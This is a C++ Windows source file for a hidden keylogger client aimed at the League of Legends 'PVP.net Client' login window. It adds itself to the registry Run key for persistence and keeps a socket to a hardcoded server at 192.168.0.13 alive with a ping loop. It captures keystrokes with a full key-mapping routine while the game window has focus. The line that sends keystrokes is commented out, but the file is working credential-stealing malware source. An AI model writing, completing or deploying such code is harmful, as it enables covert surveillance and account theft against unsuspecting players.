//Winsock client compat with multi thread server
//getting head
#include<windows.h>
#include <winsock2.h>
#include <windns.h>
#include <iostream>
#include <process.h>
#include <stdio.h>
#include <string>
#include <tchar.h>



using namespace std;

//-----Prototypes and global vars
char getKey(int key); //KeyloggerK
TCHAR exepath[MAX_PATH]; //Persistence reg variables
HKEY hKey; //Persistence reg variables
                ///==Protocol
const char pingbuffer[1] = {00}; // Ping server command
const char windowbuffer[1] = {01}; //Window open server command
const char focusbuffer[1] = {02}; //Window open server command
char logbuffer[5]; //general buffer for sending keystrokes to serv
               ///==Protocol

int isCapsLock();
WSADATA wsaData;
int iResult; //Validity switch
sockaddr_in addr;
SOCKET sock,client;
struct hostent *he; //Stupid addr struct to hold our resolved IP
struct in_addr **addr_list; //Stupid addr struct to hold our resolved IP
int i;  // Placmarker for  resolved IP struct
string hostname;
int PORT;
int LoLHandler(SOCKET* sock, HWND hwnd); //Our keylogg handler
HWND hwnd; //Our window handler ofr LoL
//--------------------------------


int main()


{

    /////////////////////////////PERSISTANCE////////////////

//Add file to startup , starts when windows starts >:D
 GetModuleFileName(0, exepath, MAX_PATH);
    LONG lnRes = RegOpenKeyEx(
           HKEY_CURRENT_USER,
           "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
           0,KEY_WRITE,
           &hKey
       );
       if( ERROR_SUCCESS == lnRes )
       {
          lnRes = RegSetValueEx(hKey,
                         "PROJECTZ",
                         0,
                         REG_SZ,
                         (BYTE*) exepath,
                         _tcslen(exepath));

                         }

   /////////////////////////////PERSISTANCE////////////////


//This will be a hidden process , so we will keep verbosity low mainly for debugging
    ///________WSA Prep +Check
    addr.sin_family = AF_INET;
    iResult = WSAStartup(MAKEWORD(2,2),&wsaData);

    if(iResult){

        printf("[X]WSA Startup failure..");
        return 0;
            }
 ///____________

connect:

    ///____________DNS + PORT___(These are hard coded for now)
    addr.sin_port = htons(9900);
        //-------Resolve DNS----
            he = gethostbyname("192.168.0.13"); //
if (!he)
  { puts("[i]Host could not be resolved..");
    return 0; //try again
  }else{
  addr_list = (struct in_addr **)he->h_addr_list;

  for(i = 0; addr_list[i] != NULL; i++) { //cycle thru possible hosts
         printf("[i]Host Found:%s", inet_ntoa(*addr_list[i]));
        // addr.sin_addr.S_un.S_addr = inet_addr("192.168.0.15");
        addr.sin_addr.S_un.S_addr = inet_addr(inet_ntoa(*addr_list[i])); //SET OUR FUCKING IP TO RESOLVED DNS !
         break;
    }
  }
         //-------Resolve DNS----

 ///_________________________________________________________


///____Socket set + Check
 sock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
 if(sock == INVALID_SOCKET){
        printf("[X]Invalid Socket..\n");
        return 0;

                        }
///_______

///_____Connect to server!!! Yeehaw

while(connect(sock,(SOCKADDR*)&addr,sizeof(sockaddr_in))){ //if error{
printf("Fail connect..");
}


//Ping loop .. very confusing at first glance , we always want to ping the server every second , so our commands are sent inside the ping loop!
for(;;){

     while(send(sock,pingbuffer,sizeof(pingbuffer),0) != SOCKET_ERROR){

       if(hwnd = FindWindow( NULL, TEXT("PVP.net Client")))
          {
              LoLHandler(&sock,hwnd);
          } //Set up a HWND to check if a certain window is open as per its title
/*
      if(hwnd!=NULL) {


*/
      Sleep(1000); // NO SPAM!
     }

       // Send a ping buffer

      //we do first because we want to make sure we have the buffer ready , then we while to check if the server is up while also informing the server we are alive
 break; // if we get here , send = socket_error , meaning server down. break out of do loop and go back to connect loop if server downs
}

//If we get here it means the server down, attempt to reconnect.
closesocket(sock);
goto connect;



//________________

return 0;
}
//====================LOL WINDOW HANDER==========================
int LoLHandler(SOCKET* sock, HWND hwnd){


    printf("LoL Open");

send(*sock,windowbuffer,sizeof(windowbuffer),0);
if(GetForegroundWindow() == hwnd){
        Sleep(500);
send(*sock,focusbuffer,sizeof(focusbuffer),0);
printf("LoL Focus");
}
while(GetForegroundWindow()==hwnd){
//send(*sock,focusbuffer,sizeof(focusbuffer),0);


        //printf("LoL Focused");
            //~~~~~~~~~~~~~~~~~~~Keylog loop

            for(int z=8;z<=127;z++){

    if (GetAsyncKeyState(z)== -32767)
{

if(z != VK_SHIFT && z != VK_CAPITAL) // dont capture caps and shift , its handlded in getKey
cout << getKey(z);
}




// send(*sock,getKey(z),sizeof(focusbuffer),0);


                                    }

}



return 0;
}
//====================LOL WINDOW HANDER==========================




//====================KEYLOGGER==========================

char getKey(int key){


 //~~Special chars!!
 if (key ==46)
 return '.';
 switch (key){
 case VK_BACK:
 return '\b';
 case VK_RETURN:
return '\n';
 case VK_SPACE:
return ' ';
 case VK_TAB:
return '\t';
 case VK_SHIFT:
    break; //dont display shift as it's handled
 case VK_CAPITAL:
    break; // ''
  case VK_OEM_2:
      if(GetAsyncKeyState(0x10) & 0x8000) //if shift held
         return '?';
      else
        return '/';
  case VK_OEM_3:
       if(GetAsyncKeyState(0x10) & 0x8000)
         return '~';
       else
        return '`';
 case VK_OEM_4:
     if(GetAsyncKeyState(0x10) & 0x8000)
     return '{';
     else
        return '[';
  case VK_OEM_5:
       if(GetAsyncKeyState(0x10) & 0x8000)
        return '|';
       else
        return '\\';
  case VK_OEM_6:
        if(GetAsyncKeyState(0x10) & 0x8000)
            return '}';
        else
            return ']';
  case VK_OEM_7:
        if(GetAsyncKeyState(0x10) & 0x8000)
            return '\"';
        else
            return '\'';
  case 0xBC: //coma
          if(GetAsyncKeyState(0x10) & 0x8000)
             return '<';
          else
            return ',';
  case 0xBE:   //period
         if(GetAsyncKeyState(0x10) & 0x8000)
             return '>';
        else
            return '.';
  case 0xBA: // semi cole
       if(GetAsyncKeyState(0x10) & 0x8000)
            return ':';
       else
            return ';';
 case 0xBD:  // minus
        if(GetAsyncKeyState(0x10) & 0x8000)
            return '_';
        else
            return '-';
  case 0xBB: //equals
       if(GetAsyncKeyState(0x10) & 0x8000)
         return '+';
       else
         return '=';
 }
 //~~Special chars!!



 //~~NUMBERS!!
 if ((key >= 39) && (key <= 64)) { //ASCII 0-9
 if (GetAsyncKeyState(0x10) & 0x8000){ //If shift is held down
        switch (key)
        {
             case 0x30:
                   return ')';
                case 0x31:
                    return '!';
                case 0x32:
                    return'@';

                case 0x33:
                 return'#';

                case 0x34:
                  return '$';

                case 0x35:
                    return '%';

                case 0x36:
                   return '^';

                case 0x37:
                    return '&';

                case 0x38:
                    return '*';

                case 0x39:
                   return '(';

        }


 }else{
 return key; //else its a number
 }
 }
  //~~NUMBERS!!

 //~~LETTERS!!
 else if ((key > 64) && (key < 91))//a-z
 {
     if(!(GetAsyncKeyState(0x10)& 0x8000) ^ (isCapsLock())){ //XoR to see if it's a caps + shift combo ....those nested ()'s!!!!!!!
         key += 32; // uncaps
     }
return key; //else its caps
 //~~LETTERS!!

}
}





//=====================Check caps lock on for keylog=============
int isCapsLock(void)
{
    return (GetKeyState(VK_CAPITAL) & 0x0001);
}

